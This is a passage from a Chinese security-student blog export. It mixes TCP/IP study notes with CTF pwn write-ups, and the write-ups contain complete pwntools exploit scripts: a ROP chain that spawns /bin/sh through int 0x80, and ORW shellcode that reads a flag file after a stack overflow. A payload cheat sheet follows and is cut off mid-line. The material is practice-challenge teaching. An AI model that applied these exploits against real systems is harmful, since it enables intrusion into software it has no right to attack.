class="headerlink" title="数据链路层"></a>数据链路层</h2><p>逻辑链路控制子层</p><p>介质访问控制子层</p><h2 id="MAC寻址"><a href="#MAC寻址" class="headerlink" title="MAC寻址"></a>MAC寻址</h2><p>广播帧：目的MAC为广播地址（全1）</p><h2 id="Ethernet-II帧格式"><a href="#Ethernet-II帧格式" class="headerlink" title="Ethernet II帧格式"></a>Ethernet II帧格式</h2><h2 id="记忆-1"><a href="#记忆-1" class="headerlink" title="记忆"></a>记忆</h2><p>交换机工作在数据链路层</p><p>冲突域：每个节点都能接收到所有被发送的帧</p><p>广播域：能接收任一发出的广播</p><p>路由器隔绝广播</p><p>网桥：有两网卡，接两端线缆</p><p>链路层协议：IEEE802.3 .4 .5 SLIP(串行线路Internet协议)，CSLIP()，PPP(点对点)</p><p>SLIP：需要先知道ip，并且没有校验</p><p>ARP和RARP</p><p>静态映射：通过地址映射表与物理地址之间的映射</p><p>动态映射：自动维护逻辑地址和物理地址</p><h2 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h2><p>广播请求，单播相应</p><p>物理层广播，IP路由（网络层）不会转发</p><h3 id="跨子网的地址解析"><a href="#跨子网的地址解析" class="headerlink" title="跨子网的地址解析"></a>跨子网的地址解析</h3><p>？？</p><h2 id="记忆-2"><a href="#记忆-2" class="headerlink" title="记忆"></a>记忆</h2><p>若分配dhcp到的ip为169.254开头，说明dhcp服务有问题</p><p>分片数据大小必须为8字节的整数倍，否则无法表述偏移量</p><p>功能</p><ul><li>报告差错</li><li>查询</li></ul><h2 id="差错报文"><a href="#差错报文" class="headerlink" title="差错报文"></a>差错报文</h2><p>差错报告报文：当路由器或目的主机处理IP数据报遇到问题时，查询报文以请求/应答形式成对出现</p><p>差错报告报文：源抑制 源站抑制报告，降低源发包速度</p><p>目的不可达：网络不可达，主机不可达，协议不可达和端口不可达</p><p>网络不可达可能路由表或者目的地址有错。主机不可达可能信宿机不在运行中或不存在，并说明网络可达。</p><h3 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h3><p>目的主机进行分片重组时会启动重组计时器，一旦超时就会丢弃正在重组的数据报，并产生ICMP数据报超时报告 </p><h3 id="重定向报文"><a href="#重定向报文" class="headerlink" title="重定向报文"></a>重定向报文</h3><p>路由收到报文后，判断是否最佳选择，不是就发送重定向报文，通知源主机修改路由表，最佳下一跳路由器的IP地址</p><h3 id="计算应答时间"><a href="#计算应答时间" class="headerlink" title="计算应答时间"></a>计算应答时间</h3><img src="/2020/02/08/TCPIP%E5%A4%8D%E4%B9%A0/image-20200104202342626.png" class="" title="image-20200104202342626"><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>ping和tracert</p><p>##RIP 距离向量路由协议</p><p>==通过度量值判断路径的好坏==</p><p>包含：路径长度，跳数，可靠性，延迟，带宽，负载，通讯费用</p><p>RIP V1 不支持VLSM V2 支持认证</p><h2 id="OSPF-链路状态路由协议"><a href="#OSPF-链路状态路由协议" class="headerlink" title="OSPF 链路状态路由协议"></a>OSPF 链路状态路由协议</h2><p>==通过管理距离判断路径好坏==</p><p>每种路径由协议分配信任等级，根据算法的好坏</p><h2 id="BGP协议"><a href="#BGP协议" class="headerlink" title="BGP协议"></a>BGP协议</h2><p>边界网关协议，用于自治系统之间</p><p>小于1024端口做公用端口，全局方式进行分配</p><p>1024～65535 临时端口</p><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p>面向字节流。TCP使用缓冲区</p><h3 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h3><p>SEQ 是随机数</p><p>客户端</p><p>第一次：SEQ = m , SYN = 1</p><p>服务器</p><p>第二次：SEQ = n，AN = m + 1，SYN=1，ACK=1</p><p>客户端</p><p>第三次：SEQ = m + 1 , AN = n +1 , ACK = 1</p><h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2><p>面向报文 使用队列</p><p>169.254 本地链路地址</p><h2 id="DHCP报文格式"><a href="#DHCP报文格式" class="headerlink" title="DHCP报文格式"></a>DHCP报文格式</h2><p>网关IP地址 如果跨网段使用DHCP中继，此字段包含中继代理的ip地址</p><p>windows域 WINS协议</p><p>DNS递归解析，反向解析</p>]]></content>
    
    
    <categories>
      
      <category>专业学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>专业学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网杯2019_拟态-STKOF</title>
    <link href="/2020/02/08/%E5%BC%BA%E7%BD%91%E6%9D%AF2019_%E6%8B%9F%E6%80%81-STKOF/"/>
    <url>/2020/02/08/%E5%BC%BA%E7%BD%91%E6%9D%AF2019_%E6%8B%9F%E6%80%81-STKOF/</url>
    
    <content type="html"><![CDATA[<p>这题给了两文件，分别是32和64位的，32位的由于是静态链接，直接自动生成就能打通。</p><p>打到buu服务器上时，exp是随机打到两个程序中的一个的，就我测试来看64位的出现多点</p><p>搜了一搜，当时比赛好像是要一个exp打通两个程序才行</p><p>备份学习链接：</p><p><a href="https://blog.csdn.net/qq_41071646/article/details/90607928">强网杯 签到re 签到pwn 题解</a></p><p><a href="https://www.anquanke.com/post/id/195801?from=singlemessage">拟态防御型Pwn题做题思路总结</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ROPgadget&amp;系统调用-cmcc_simplerop</title>
    <link href="/2020/02/08/ROPgadget&amp;%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/"/>
    <url>/2020/02/08/ROPgadget&amp;%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/</url>
    
    <content type="html"><![CDATA[<img src="/2020/02/08/ROPgadget&%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/image-20200204141031239.png" class="" title="image-20200204141031239"><img src="/2020/02/08/ROPgadget&%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/image-20200204141049853.png" class="" title="image-20200204141049853"><p>第一反应就是用ROPgadget自动生成ropchains</p><p>但在这里不行，算出来的偏移是0x20，那么只有68字节给ropchains了</p><img src="/2020/02/08/ROPgadget&%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/image-20200204141245719.png" class="" title="image-20200204141245719"><p>而自动生成的都太长了= =，只能手动调整ropchains长度</p><blockquote><p>参考<a href="http://m4x.fun/post/hitcon-training-writeup/">http://m4x.fun/post/hitcon-training-writeup/</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack <br><br>pop_edx_ecx_ebx = <span class="hljs-number">0x0806e850</span><br>payload = cyclic(<span class="hljs-number">0x14</span> + <span class="hljs-number">12</span>) <br><br>p = <span class="hljs-keyword">lambda</span> x : pack(<span class="hljs-string">&#x27;I&#x27;</span>, x)<br>IMAGE_BASE_0 = <span class="hljs-number">0x08048000</span> <span class="hljs-comment"># ./simplerop</span><br>rebase_0 = <span class="hljs-keyword">lambda</span> x : p(x + IMAGE_BASE_0)<br><br>rop = <span class="hljs-string">&#x27;&#x27;</span><br>rop += rebase_0(<span class="hljs-number">0x00072e06</span>) <span class="hljs-comment"># 0x080bae06: pop eax; ret; </span><br>rop += <span class="hljs-string">&#x27;/bin&#x27;</span><br>rop += rebase_0(<span class="hljs-number">0x0002682a</span>) <span class="hljs-comment"># 0x0806e82a: pop edx; ret; </span><br>rop += rebase_0(<span class="hljs-number">0x000a3060</span>)<br>rop += rebase_0(<span class="hljs-number">0x0005215d</span>) <span class="hljs-comment"># 0x0809a15d: mov dword ptr [edx], eax; ret; </span><br>rop += rebase_0(<span class="hljs-number">0x00072e06</span>) <span class="hljs-comment"># 0x080bae06: pop eax; ret; </span><br>rop += <span class="hljs-string">&#x27;/sh\x00&#x27;</span><br>rop += rebase_0(<span class="hljs-number">0x0002682a</span>) <span class="hljs-comment"># 0x0806e82a: pop edx; ret; </span><br>rop += rebase_0(<span class="hljs-number">0x000a3064</span>)<br>rop += rebase_0(<span class="hljs-number">0x0005215d</span>) <span class="hljs-comment"># 0x0809a15d: mov dword ptr [edx], eax; ret;</span><br>rop += pack(<span class="hljs-string">&#x27;I&#x27;</span>, pop_edx_ecx_ebx)<br>rop += p(<span class="hljs-number">0</span>)<br>rop += p(<span class="hljs-number">0</span>)<br>rop += rebase_0(<span class="hljs-number">0x000a3060</span>)<br>rop += rebase_0(<span class="hljs-number">0x00072e06</span>) <span class="hljs-comment"># 0x080bae06: pop eax; ret; </span><br>rop += p(<span class="hljs-number">0x0000000b</span>)<br>rop += rebase_0(<span class="hljs-number">0x00026ef0</span>) <span class="hljs-comment"># 0x0806eef0: int 0x80; ret;</span><br></code></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./simplerop&#x27;</span>)<br>lib = <span class="hljs-number">0</span><br>sh = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">ip,port,debug</span>):</span><br>    <span class="hljs-keyword">global</span> lib<br>    <span class="hljs-keyword">global</span> sh<br>    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>        sh = process(<span class="hljs-string">&#x27;./simplerop&#x27;</span>)<br>        <span class="hljs-comment">#lib = ELF(&#x27;&#x27;)</span><br>    <span class="hljs-keyword">else</span>:<br>        sh = remote(ip,port)<br>        <span class="hljs-comment">#lib = ELF(&#x27;./home/mrbelieve/Desktop/PWN/buu/libc/32-libc-2.23.so&#x27;)</span><br>    <span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack <br><br>    pop_edx_ecx_ebx = <span class="hljs-number">0x0806e850</span><br>    payload = cyclic(<span class="hljs-number">0x14</span> + <span class="hljs-number">12</span>) <br><br>    p = <span class="hljs-keyword">lambda</span> x : pack(<span class="hljs-string">&#x27;I&#x27;</span>, x)<br>    IMAGE_BASE_0 = <span class="hljs-number">0x08048000</span> <span class="hljs-comment"># ./simplerop</span><br>    rebase_0 = <span class="hljs-keyword">lambda</span> x : p(x + IMAGE_BASE_0)<br><br>    rop = <span class="hljs-string">&#x27;&#x27;</span><br>    rop += rebase_0(<span class="hljs-number">0x00072e06</span>) <span class="hljs-comment"># 0x080bae06: pop eax; ret; </span><br>    rop += <span class="hljs-string">&#x27;/bin&#x27;</span><br>    rop += rebase_0(<span class="hljs-number">0x0002682a</span>) <span class="hljs-comment"># 0x0806e82a: pop edx; ret; </span><br>    rop += rebase_0(<span class="hljs-number">0x000a3060</span>)<br>    rop += rebase_0(<span class="hljs-number">0x0005215d</span>) <span class="hljs-comment"># 0x0809a15d: mov dword ptr [edx], eax; ret; </span><br>    rop += rebase_0(<span class="hljs-number">0x00072e06</span>) <span class="hljs-comment"># 0x080bae06: pop eax; ret; </span><br>    rop += <span class="hljs-string">&#x27;/sh\x00&#x27;</span><br>    rop += rebase_0(<span class="hljs-number">0x0002682a</span>) <span class="hljs-comment"># 0x0806e82a: pop edx; ret; </span><br>    rop += rebase_0(<span class="hljs-number">0x000a3064</span>)<br>    rop += rebase_0(<span class="hljs-number">0x0005215d</span>) <span class="hljs-comment"># 0x0809a15d: mov dword ptr [edx], eax; ret;</span><br>    rop += pack(<span class="hljs-string">&#x27;I&#x27;</span>, pop_edx_ecx_ebx)<br>    rop += p(<span class="hljs-number">0</span>)<br>    rop += p(<span class="hljs-number">0</span>)<br>    rop += rebase_0(<span class="hljs-number">0x000a3060</span>)<br>    rop += rebase_0(<span class="hljs-number">0x00072e06</span>) <span class="hljs-comment"># 0x080bae06: pop eax; ret; </span><br>    rop += p(<span class="hljs-number">0x0000000b</span>)<br>    rop += rebase_0(<span class="hljs-number">0x00026ef0</span>) <span class="hljs-comment"># 0x0806eef0: int 0x80; ret; </span><br>    <br>    sh.sendline(payload + rop)<br><br>    sh.interactive()<br><span class="hljs-keyword">if</span> __name__ ==  <span class="hljs-string">&quot;__main__&quot;</span>:<br>    pwn(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25335</span>,<span class="hljs-number">0</span> )<br></code></pre></td></tr></table></figure><h2 id="另一种解法"><a href="#另一种解法" class="headerlink" title="另一种解法"></a>另一种解法</h2><blockquote><p>新姿势 &gt;rop chain后 int 0x80中断从而执行系统调用&gt; execve(/bin/sh)。</p><p>原理：通过一系列 pop|ret 等gadget，使得 eax = 0xb（execve 32 位下的系统调用号），ebx -&gt; /bin/sh， ecx = edx = 0，然后通过 int 0x80 实现系统调用，执行 execve(“/bin/sh”, 0, 0)<br>————————————————<br>版权声明：本文为CSDN博主「Yof3ng」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_40173126/article/details/83348870">https://blog.csdn.net/qq_40173126/article/details/83348870</a></p><p>版权声明：本文为CSDN博主「Yof3ng」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>[原文链接])(<a href="https://blog.csdn.net/qq_40173126/article/details/83348870">https://blog.csdn.net/qq_40173126/article/details/83348870</a>)</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*  <br>p = process(<span class="hljs-string">&#x27;./simplerop&#x27;</span>)  <br>elf = ELF(<span class="hljs-string">&#x27;./simplerop&#x27;</span>)  <br>  <br>pop_edx_ecx_ebx = <span class="hljs-number">0x0806eca0</span>  <br>pop_eax = <span class="hljs-number">0x080b7e26</span>  <br>pop_edx = <span class="hljs-number">0x0806ec7a</span>  <br>int_80 = <span class="hljs-number">0x0806c8f5</span>  <br>gadget = <span class="hljs-number">0x080707b9</span> <span class="hljs-comment"># mov word ptr [edx],eax  </span><br>bss = elf.bss()  <br>read_plt = elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]  <br>  <br>  <br>p.recv()  <br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">32</span> + p32(pop_edx) +p32(bss)+ p32(pop_eax) +<span class="hljs-string">&quot;/bin&quot;</span>+ p32(gadget)  <br>payload +=  p32(pop_edx) + p32(bss+<span class="hljs-number">4</span>) + p32(pop_eax) + <span class="hljs-string">&quot;/sh\x00&quot;</span> + p32(gadget)  <br>payload += p32(pop_edx_ecx_ebx) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(bss) <br>payload += p32(pop_eax) + p32(<span class="hljs-number">0xb</span>)  <br>payload += p32(int_80)  <br>  <br>p.send(payload)  <br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-ROPgadget -系统调用号</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解密系列笔记</title>
    <link href="/2020/02/08/%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97/"/>
    <url>/2020/02/08/%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97/</url>
    
    <content type="html"><![CDATA[<h1 id="解密系列"><a href="#解密系列" class="headerlink" title="解密系列"></a>解密系列</h1><p>ASCII编码是Unicode字符编码的一部分</p><p>系统dll属于level3，内核运行在level0. </p><h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p>在保护模式下：</p><ul><li>应用程序是不会直接访问物理地址的</li><li>虚拟内存管理器通过虚拟地址的访问请求，控制所有物理地址访问</li><li>每个程序都有独立的4GB寻址空间，不同程序的地址空间是被相互隔离的。</li><li>DLL程序没有自己的“私有”空间，它们称之为动态链接库文件，它们总是被映射到其他应用程序的地址空间中的，作为其他应用程序的一部分运行。</li></ul><p>==简化了内存的管理，并可弥补物理内存的不足，另外可以防止多任务环境下各个应用程序之间的冲突==</p><p>与实地址模式下的“段地址：偏移地址”索引方式类似，虚拟地址也写成“段：偏移量”，但为段选择子。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础知识</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ORW-[极客大挑战2019]Not_Bad</title>
    <link href="/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/"/>
    <url>/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/</url>
    
    <content type="html"><![CDATA[<img src="/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/image-20200203001107437.png" class="" title="image-20200203001107437"><h2 id="RWX"><a href="#RWX" class="headerlink" title="RWX"></a>RWX</h2><blockquote><ul><li>Linux的文件和目录的权限，有RWX三种。</li><li>r(Read，读取)：对文件而言，具有读取文件内容的权限；对目录来说，具有<strong>浏览目录</strong>的权限。</li><li>w(Write,写入)：对文件而言，具有新增,修改,删除文件内容的权限；对目录来说，具有<strong>新建，删除，修改，移动目录内文件</strong>的权限。</li><li>x(eXecute，执行)：对文件而言，具有执行文件的权限；对目录了来说<strong>该用户具有进入目录</strong>的权限</li></ul></blockquote><img src="/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/image-20200203144946071.png" class="" title="image-20200203144946071"><p><a href="[https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/](https://blog.betamao.me/2019/01/23/Linux沙箱之seccomp/)">什么是seccomp</a></p><p>用<a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>检测一下<code>seccomp-tools dump  ./bad</code></p><img src="/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/image-20200203145031485.png" class="" title="image-20200203145031485"><p>可运行open,read,write，也就是ORW</p><h2 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h2><img src="/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/image-20200203145324266.png" class="" title="image-20200203145324266"><img src="/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/image-20200203145300314.png" class="" title="image-20200203145300314"><p><code>void *mmap(void *start,size_t length,int prot,int flags,int fd,off_t offsize);</code></p><blockquote><p>mmap()函数的主要用途有三个：<br>1、将一个普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，这样用内存读写取代I/O读写，以获得较高的性能；<br>2、将特殊文件进行匿名内存映射，可以为关联进程提供共享内存空间；<br>3、为无关联的进程提供共享内存空间，一般也是将一个普通文件映射到内存中。<br>————————————————<br>版权声明：本文为CSDN博主「为幸福写歌」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br><a href="https://blog.csdn.net/yzy1103203312/article/details/78286360">原文链接</a></p></blockquote><p>总的来说就是，我们可以在这里写入orw_shellcode然后运行hhh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">orw_shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag&quot;</span>)<br>orw_shellcode += shellcraft.read(<span class="hljs-number">3</span>,<span class="hljs-number">0x123000</span>,<span class="hljs-number">0x30</span>)<br>orw_shellcode += shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-number">0x123000</span>,<span class="hljs-number">0x30</span>)<br></code></pre></td></tr></table></figure><p>read(3,addr,length)，3指从文件目录中读取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = asm(shellcraft.read(<span class="hljs-number">0</span>,<span class="hljs-number">0x123000</span>,<span class="hljs-number">0x90</span>)) + asm(<span class="hljs-string">&quot;mov rax,0x123000;call rax&quot;</span>)<br>   payload = payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&quot;\x00&quot;</span>)<br>   payload += p64(<span class="hljs-number">0x400A01</span>)<span class="hljs-comment">#jmp rsp</span><br>   payload += asm(<span class="hljs-string">&quot;sub rsp,0x30;call rsp&quot;</span>)<br>   sh.sendline(payload)<br></code></pre></td></tr></table></figure><p>这样子，我们溢出之后，先执行jmp rsp，然后读入到0x123000的shellcdoe，读入完成之后执行call rax运行shellcode</p><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./bad&#x27;</span>)<br>lib = <span class="hljs-number">0</span><br>sh = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">ip,port,debug</span>):</span><br>    <span class="hljs-keyword">global</span> lib<br>    <span class="hljs-keyword">global</span> sh<br>    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>        sh = process(<span class="hljs-string">&#x27;./bad&#x27;</span>)<br>        lib = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        sh = remote(ip,port)<br>        lib = ELF(<span class="hljs-string">&#x27;/home/robye/Desktop/PWN/libc/64-libc-2.27.so&#x27;</span>)<br>    <br>    orw_shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag&quot;</span>)<br>    orw_shellcode += shellcraft.read(<span class="hljs-number">3</span>,<span class="hljs-number">0x123000</span>,<span class="hljs-number">0x30</span>)<br>    orw_shellcode += shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-number">0x123000</span>,<span class="hljs-number">0x30</span>)<br><br>    sh.recvuntil(<span class="hljs-string">&quot;fun!&quot;</span>)<br>    payload = asm(shellcraft.read(<span class="hljs-number">0</span>,<span class="hljs-number">0x123000</span>,<span class="hljs-number">0x90</span>)) + asm(<span class="hljs-string">&quot;mov rax,0x123000;call rax&quot;</span>)<br>    payload = payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&quot;\x00&quot;</span>)<br>    payload += p64(<span class="hljs-number">0x400A01</span>)<br>    payload += asm(<span class="hljs-string">&quot;sub rsp,0x30;call rsp&quot;</span>)<br>    sh.sendline(payload)<br>    sleep(<span class="hljs-number">0.1</span>)<br>    sh.sendline(asm(orw_shellcode))<br><br>    sh.interactive()<br><span class="hljs-keyword">if</span> __name__ ==  <span class="hljs-string">&quot;__main__&quot;</span>:<br>    pwn(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26591</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>向<a href="http://www.qfrost.com/PWN/geek_pwn/">Qfroest</a>大佬学习</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-Shellcode -ORW</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pwn常用指令</title>
    <link href="/2020/02/05/Pwn%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
    <url>/2020/02/05/Pwn%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p><code>ldd filename</code> 读取libc</p><p><code>ROPgadget --binary filename --only &quot;pop|ret&quot;</code></p><p><code>__libc_start_main = u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))</code></p><p><code>__libc_start_main = u32(sh.recvuntil(&quot;\xf7&quot;)[-4:])</code></p><p><code>__libc_start_main = u32(sh.recv(4))</code></p><p><code>canary =  u64(sh.recv(7).rjust(8,&quot;\x00&quot;)) log.success(&quot;canary------&gt;&quot; + hex(canary))</code></p><p>接受成int型地址：<code>str_addr = int(sh.recvuntil(&quot;\n&quot;,True),16)</code></p><p><code>seccomp-tools dump ./filename</code></p><p>找不到flag：<code>grep -rn flag *</code></p><p>32位</p><p>第一个放在rdi 第二个放在rsi 第三个放在rdx</p><p>64位就得</p><h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><h3 id="print"><a href="#print" class="headerlink" title="print"></a>print</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p32(printf_plt)<br>payload += p32(start_vuln)<br>payload += p32(<span class="hljs-number">0x080486F8</span>)<br>payload += p32(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br><br></code></pre></td></tr></table></figure><h3 id="system-“-bin-sh”"><a href="#system-“-bin-sh”" class="headerlink" title="system(“/bin/sh”)"></a>system(“/bin/sh”)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p32(system)<br>payload += p32(<span class="hljs-number">0</span>)<br>payload += p32(binsh)<br>sh.sendline(payload)<br></code></pre></td></tr></table></figure><h3 id="write"><a href="#write" class="headerlink" title="write"></a>write</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p32(elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>])<br>payload += p32(pop_esi_edi_ebp_ret)<br>payload += 